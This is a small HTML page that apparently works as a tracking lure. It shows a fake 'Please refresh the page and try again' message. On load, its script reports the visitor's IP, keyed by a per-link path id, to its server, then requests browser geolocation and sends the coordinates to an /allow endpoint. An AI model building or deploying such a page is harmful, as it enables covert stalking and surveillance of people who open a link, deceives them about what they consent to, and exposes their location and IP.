<!DOCTYPE html>
<html>

<body>
    <p>Please refresh the page and try again</p>
    <p id="AllowLocation"></p>
    <p id="IPinfo"></p>
    
    <script>
        var Latitude;
        var Longitude;
        window.onload = async function() {
            
            await fetch(window.location.origin+'/ip?cl='+window.location.pathname)
            document.getElementById("IPinfo").innerHTML = "Ipinfo is allowed";
        
        if (await navigator.geolocation) {
            await navigator.geolocation.getCurrentPosition(showPosition);
            
            
        } else {
            document.getElementById("AllowLocation").innerHTML = "Geolocation is not supported by this browser.";
            await fetch(window.location.origin+'/ip?cl='+window.location.pathname)
            await navigator.geolocation.getCurrentPosition(showPosition);
        }

        async function showPosition(position) {
                Latitude=await position.coords.latitude;
                Longitude=await position.coords.longitude;
                await fetch(window.location.origin+'/allow?lat='+position.coords.latitude+','+position.coords.longitude +'&cl='+window.location.pathname )      
                document.getElementById("AllowLocation").innerHTML = "Geolocation is allowed";
        }
            };  

    </script>
 

</body>

</html>
